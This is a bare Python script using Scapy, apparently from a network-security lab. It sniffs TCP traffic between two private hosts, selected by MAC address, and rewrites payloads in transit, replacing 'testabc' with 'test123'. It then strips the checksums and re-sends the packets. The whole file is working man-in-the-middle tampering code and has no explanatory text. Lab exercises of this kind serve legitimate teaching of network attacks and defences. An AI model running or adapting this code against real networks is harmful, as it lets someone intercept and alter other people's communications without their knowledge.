from scapy.all import *
from scapy.layers.inet import TCP, IP
from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import sendp, sniff


def modify_pkt(pkt):
    new_pkt = pkt[IP]

    if pkt[IP].dst == "10.0.2.9" and pkt[IP].src == "10.0.2.15" \
            and pkt[TCP].payload:
        new_pkt.show()
        data = pkt[TCP].payload.load

        del new_pkt.chksum
        del new_pkt[TCP].chksum
        del new_pkt[TCP].payload

        new_data = data.replace(b"testabc", b"test123")
        new_pkt = new_pkt / new_data


    elif pkt[IP].dst == "10.0.2.15" and pkt[IP].src == "10.0.2.9":
        pass
    send(new_pkt)


pkt = sniff(filter="((ether src host 08:00:27:20:65:f6 and ether dst host 08:00:27:72:0c:aa ) or \
                    (ether src host 08:00:27:0d:9b:83 and ether dst host 08:00:27:72:0c:aa)) \
                     and tcp"
            , prn=modify_pkt)